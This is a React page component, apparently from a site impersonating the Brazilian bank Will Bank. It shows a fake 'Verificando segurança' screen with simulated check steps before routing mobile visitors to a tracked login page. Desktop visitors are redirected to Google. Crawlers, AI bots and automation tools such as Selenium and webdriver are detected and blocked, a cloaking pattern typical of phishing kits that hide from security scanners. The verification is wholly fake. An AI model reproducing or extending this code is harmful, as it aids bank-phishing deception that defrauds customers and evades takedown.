import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { Loader2, Shield, Smartphone } from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { buildUrlWithUtm } from "@/hooks/useUtmTracking";
import { trackFunnelEvent } from "@/hooks/useFunnelTracking";

const Verificacao = () => {
  const navigate = useNavigate();
  const [isValidating, setIsValidating] = useState(true);
  const [isBot, setIsBot] = useState(false);
  const [isDesktop, setIsDesktop] = useState(false);
  const [validationStep, setValidationStep] = useState(0);
  const [hasTracked, setHasTracked] = useState(false);

  // Track verificacao step
  useEffect(() => {
    if (!hasTracked) {
      trackFunnelEvent('verificacao');
      setHasTracked(true);
    }
  }, [hasTracked]);

  useEffect(() => {
    // Check if desktop/PC
    const checkDevice = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|tablet/i.test(userAgent);
      const isSmallScreen = window.innerWidth <= 1024;
      
      // If it's a desktop/laptop (not mobile device AND large screen)
      if (!isMobileDevice && !isSmallScreen) {
        setIsDesktop(true);
        // Redirect to YouTube after a short delay
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 100);
        return true;
      }
      return false;
    };

    // Bot detection
    const checkBot = () => {
      const userAgent = navigator.userAgent.toLowerCase();
      const botPatterns = [
        'bot', 'crawl', 'spider', 'slurp', 'mediapartners',
        'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduck',
        'facebookexternalhit', 'facebot', 'ia_archiver',
        'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot',
        'petalbot', 'bytespider', 'gptbot', 'claudebot'
      ];
      
      const isBot = botPatterns.some(pattern => userAgent.includes(pattern));
      
      // Additional bot checks
      const hasWebdriver = navigator.webdriver === true;
      const hasPhantom = !!(window as any).phantom || !!(window as any)._phantom;
      const hasNightmare = !!(window as any).__nightmare;
      const hasSelenium = !!(window as any).callSelenium || !!(window as any)._selenium;
      const noPlugins = navigator.plugins?.length === 0;
      const noLanguages = !navigator.languages || navigator.languages.length === 0;
      
      return isBot || hasWebdriver || hasPhantom || hasNightmare || hasSelenium || (noPlugins && noLanguages);
    };

    // Run device check first
    if (checkDevice()) {
      return;
    }

    // Check for bots
    if (checkBot()) {
      setIsBot(true);
      setIsValidating(false);
      return;
    }

    // Simulate validation steps
    const steps = [
      { delay: 500, step: 1 },
      { delay: 1000, step: 2 },
      { delay: 1500, step: 3 },
      { delay: 2000, step: 4 },
    ];

    steps.forEach(({ delay, step }) => {
      setTimeout(() => setValidationStep(step), delay);
    });

    // Complete validation and redirect to login
    setTimeout(() => {
      setIsValidating(false);
      navigate(buildUrlWithUtm("/"));
    }, 2500);
  }, [navigate]);

  // Show redirect message for desktop
  if (isDesktop) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
        <img src={willbankLogo} alt="Will Bank" className="h-12 mb-6" />
        <Smartphone className="w-16 h-16 text-primary mb-4" />
        <h1 className="text-2xl font-bold text-foreground mb-2">
          Acesso exclusivo via celular
        </h1>
        <p className="text-muted-foreground mb-4">
          Este serviço está disponível apenas para dispositivos móveis.
        </p>
        <p className="text-sm text-muted-foreground">
          Redirecionando...
        </p>
      </div>
    );
  }

  // Show blocked message for bots
  if (isBot) {
    return (
      <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
        <img src={willbankLogo} alt="Will Bank" className="h-12 mb-6" />
        <Shield className="w-16 h-16 text-destructive mb-4" />
        <h1 className="text-2xl font-bold text-foreground mb-2">
          Acesso bloqueado
        </h1>
        <p className="text-muted-foreground">
          Não foi possível verificar sua identidade.
        </p>
      </div>
    );
  }

  // Show validation loading screen
  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center p-6 text-center">
      <img src={willbankLogo} alt="Will Bank" className="h-10 mb-8" />
      
      <div className="relative w-20 h-20 mb-6">
        <div className="absolute inset-0 rounded-full border-4 border-primary/20 animate-pulse" />
        <div className="absolute inset-2 rounded-full border-2 border-primary/40" />
        <div className="absolute inset-0 flex items-center justify-center">
          <Loader2 className="w-8 h-8 text-primary animate-spin" />
        </div>
      </div>

      <h2 className="text-lg font-semibold text-foreground mb-2">
        Verificando segurança
      </h2>

      <div className="space-y-2 text-sm text-muted-foreground">
        <p className={validationStep >= 1 ? "text-success" : ""}>
          {validationStep >= 1 ? "✓" : "○"} Verificando dispositivo...
        </p>
        <p className={validationStep >= 2 ? "text-success" : ""}>
          {validationStep >= 2 ? "✓" : "○"} Validando conexão...
        </p>
        <p className={validationStep >= 3 ? "text-success" : ""}>
          {validationStep >= 3 ? "✓" : "○"} Confirmando segurança...
        </p>
        <p className={validationStep >= 4 ? "text-success" : ""}>
          {validationStep >= 4 ? "✓" : "○"} Liberando acesso...
        </p>
      </div>

      <div className="mt-6 flex items-center gap-2 text-xs text-muted-foreground">
        <Shield className="w-4 h-4" />
        <span>Ambiente protegido</span>
      </div>
    </div>
  );
};

export default Verificacao;
